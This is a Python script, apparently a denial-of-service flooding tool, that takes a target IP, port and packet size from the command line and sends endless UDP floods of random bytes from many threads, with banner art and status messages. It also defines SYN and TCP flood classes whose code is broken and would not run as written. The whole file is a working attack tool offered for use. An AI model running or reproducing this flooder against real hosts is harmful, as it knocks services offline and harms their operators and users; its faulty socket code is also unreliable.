#!usr/bin/python
# _*_ coding: utf-8 _*_
import os
import socket
import sys
import time
import threading
import string
import random

attemps = 0 
os.system('clear')
print("""
\033[4m                                     █▒╗
                                            █▒║
  ███▒╗ ███▒╗╔███▒╗ ███▒╗  ████▒╗ ███▒║  ████▒╗ ███▒╗ █▒╗ █▒╗
 █▒║ █▒║█▒║ █▒║ █▒║█▒║ █▒║█▒║    █▒║ █▒║█▒║ █▒║█▒║ █▒║█▒║ █▒║
 █▒║ █▒║█▒║ █▒║ █▒║█▒║ █▒║█▒║    █▒║ █▒║█▒║ █▒║█▒║ █▒║█▒║ █▒║
 █▒║ █▒║█▒║ █▒║ █▒║█▒║ █▒║█▒║    █▒║ █▒║█▒║ █▒║█▒║ █▒║█▒║ █▒║
 █▒╚═█▒╝█▒║ ╚═╝ █▒║█▒╚═█▒╝█▒╚══╗ █▒╚═█▒╝█▒╚═█▒║█▒║ █▒║█▒║ █▒║
  ███▒═╝█▒╝     █▒╝ ███═╝  ████╝  ███╝   ███▒═╝ ███▒═╝ ████▒║
                                                          █▒║
                                                       ███▒═╝033[0m
""")
if len(sys.argv) < 4:
    sys.exit("\033[96mUsage: python "+sys.argv[0]+" [ip] [port] [size]\033[0m")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])
class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        time.sleep(3),
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        u = udp(ip,port,size,packets)
        u.start()
        print("\033[48;5;7m\033[38;5;0m•> " +(ip)+ " \033[32mport\033[37m: \033[94m" +str(port)+ "\033[0m")
        print("033[38;5;7m•> " +(ip)+ "\033[32m\033[3msize \033[37m" +str(size)+ "") 
        print("\033[33m\033[3m" +(ip)+ "\033[32m\033[3mpacket \033[31m" +str(packets)+ "") 
    except KeyboardInterrupt:
        print ("Stopping Flood!")
        sys.exit()
    except socket.error as e:
        print ("Socket Couldn't Connect")
        sys.exit()
